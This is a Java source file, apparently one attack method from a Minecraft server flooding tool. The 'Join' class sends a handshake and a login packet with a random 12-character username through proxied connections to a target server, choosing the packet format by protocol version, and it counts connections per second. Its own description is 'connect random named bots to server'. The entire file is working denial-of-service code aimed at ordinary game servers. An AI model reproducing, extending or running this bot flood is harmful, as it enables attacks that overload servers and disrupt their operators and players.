package dev.lastknell.core.methods.impl;

import dev.lastknell.core.config.AttackConfig;
import dev.lastknell.core.manager.ConnectionsInfo;
import dev.lastknell.core.methods.iAttackMethod;
import dev.lastknell.core.packets.Handshake;
import dev.lastknell.core.packets.LoginRequest;
import dev.lastknell.core.packets.NewLoginRequest;
import dev.lastknell.core.proxy.Proxy;
import dev.lastknell.util.RandomUtils;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;

public class Join implements iAttackMethod {
    private final AttackConfig config;
    private final byte[] handshake;
    private final boolean useNew;
    private final ConnectionsInfo info;

    public Join(AttackConfig config, ConnectionsInfo info) {
        this.config = config;
        useNew = config.protocolID > 758;
        handshake = Handshake.getWrappedPacket(config.protocolID, config.srvIp, config.port, 2);
        this.info = info;
    }

    @Override
    public void accept(Channel channel, Proxy proxy) {
        info.openedCPS++;
        channel.writeAndFlush(Unpooled.buffer().writeBytes(handshake));
        if(useNew) {
            channel.writeAndFlush(Unpooled.buffer().writeBytes(
                    NewLoginRequest.getWrappedPacket(RandomUtils.randomString(12))));
        } else {
            channel.writeAndFlush(Unpooled.buffer().writeBytes(
                    LoginRequest.getWrappedPacket(RandomUtils.randomString(12))));
        }
        info.successfulCPS++;
    }

    @Override
    public String getName() {
        return "Join";
    }

    @Override
    public String getDescription() {
        return "connect random named bots to server";
    }

}
